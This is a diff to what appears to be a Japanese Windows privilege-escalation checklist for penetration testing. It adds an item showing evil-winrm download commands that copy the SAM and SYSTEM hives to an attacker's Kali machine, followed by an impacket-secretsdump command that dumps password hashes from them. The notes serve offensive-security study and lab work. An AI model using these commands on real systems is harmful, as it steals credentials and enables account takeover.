@@ -137,6 +137,13 @@ run
 
 29. "Program Files"系のフォルダ内に、Windowsデフォルトではない見慣れないファイルやフォルダが無いか。
 
+30. SAMファイルやSYSTEMファイルにアクセス可能な場合、evil-winrmを使っていれば以下のコマンドでAttacker machineにファイルを持ってこれる。その後、Secretsdump.pyを使ってハッシュをダンプできる。
+```
+download .\SAM /home/kali/Dekstop/SAM
+download .\SYSTEM /home/kali/Desktop/SYSTEM
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+```
+
 ===========
 
 # Linux
